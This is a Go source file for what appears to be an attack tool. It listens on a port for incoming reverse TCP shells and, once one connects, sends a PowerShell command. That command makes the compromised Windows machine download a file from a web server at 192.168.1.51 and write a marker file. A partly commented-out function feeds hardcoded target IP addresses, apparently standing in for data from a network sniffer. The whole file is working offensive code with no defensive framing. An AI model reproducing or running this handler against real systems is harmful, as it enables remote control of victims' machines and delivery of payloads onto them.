package main

import (
  "fmt"
  "net"
  "bufio"
  "time"
)

func ListenForConnection() net.Conn {
  listener, _ := net.Listen("tcp4", ":5454")
  conn, err := listener.Accept()
  if err != nil {
    fmt.Println("we gotta connection accept error boss")
  }
  fmt.Println("TCP connection accepted")
  return conn
}

func CloseConnectionLoudly(conn net.Conn) {
  conn.Close()
  fmt.Println("Connection closed")
}

func ListenAndHandleTCPShell(){
  command := "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -C \"(new-object Net.WebClient).DownloadFile('http://192.168.1.51/index.html', 'C:\\downloado.txt')\" && echo succ > C:\\succ.txt"
  fmt.Println("Listening for reverse TCP shell...")

  conn := ListenForConnection()
  reader := bufio.NewReader(conn)
  writer := bufio.NewWriter(conn)


  _, readerr := reader.ReadString('>')
  if readerr != nil {
    fmt.Println("Error reading from reverse shell: " + readerr.Error())
  }
  fmt.Println("Shell acquired, launching command: " + command)
  _, writeerr := writer.WriteString(command)
  if writeerr != nil {
    fmt.Println("Error writing to reverse shell: " + writeerr.Error())
  }
  writer.WriteString("\r\n")
  writer.Flush()

  _, readerr = reader.ReadString('>')
  if readerr != nil {
    fmt.Println("Error reading from reverse shell: " + readerr.Error())
  }
  fmt.Println("Command successfully launched")

  CloseConnectionLoudly(conn)
}

func ListenForSnifferData(ip_passing_channel chan string){
  /*
  listener, _ := net.Listen("tcp", ":6565")
  for {
    conn, err := listener.Accept()
    if err != nil {
      fmt.Println("We gotta error connecting to the sniffer: " + err.Error())
    }
    ipreader := bufio.NewReader(conn)
    ip, readerr := bufio.ReadString('\x00')
    if readerr != nil {
      fmt.Println("We gotta error reading from the sniffer: " + readerr)
    }
    fmt.Println("Read IP: " + ip)
    */
    time.Sleep(1000 * time.Millisecond)
    ip := "192.168.1.53"
    ip1 := "192.168.1.54"
    fmt.Println("Listener is passing IPs")
    ip_passing_channel <- ip
    ip_passing_channel <- ip1
  //}
}
